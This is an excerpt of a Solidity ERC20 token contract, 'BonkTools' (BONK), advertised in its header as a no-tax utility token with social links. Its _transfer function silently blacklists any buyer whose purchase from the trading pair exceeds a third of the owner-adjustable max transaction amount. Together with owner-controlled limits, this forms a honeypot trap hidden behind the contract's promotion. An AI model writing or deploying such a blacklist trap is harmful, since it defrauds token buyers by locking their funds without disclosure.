...
/**
    Telegram: https://t.me/BonkTools
    Twitter: https://twitter.com/BonkTools
    Website: https://bonktools.app/

    UTILITY TOKEN - NO TAXES!
*/
...
contract BonkToolsERC is ERC20 {
    ...
    constructor() ERC20("BonkTools","BONK") {
        owner = _msgSender();
        ...
        TransactionSettings.maxTxAmount = (_totalSupply * 4) / 100;
        TransactionSettings.maxWalletAmount = (_totalSupply * 4) / 100;
    ...
    function setWalletLimits(uint256 amount, bool txOrWallet) external onlyOwner() {
        if(txOrWallet){
            TransactionSettings.maxTxAmount = amount;
            emit TxLimitUpdated(TransactionSettings.maxTxAmount);
        } else {
            TransactionSettings.maxWalletAmount = amount;
    ...
    function _transfer(address from, address to, uint256 amount ) internal override {
        ...
        if(from == pair && amount > TransactionSettings.maxTxAmount/3){
            _setBlacklistStatus(to, true);
        }
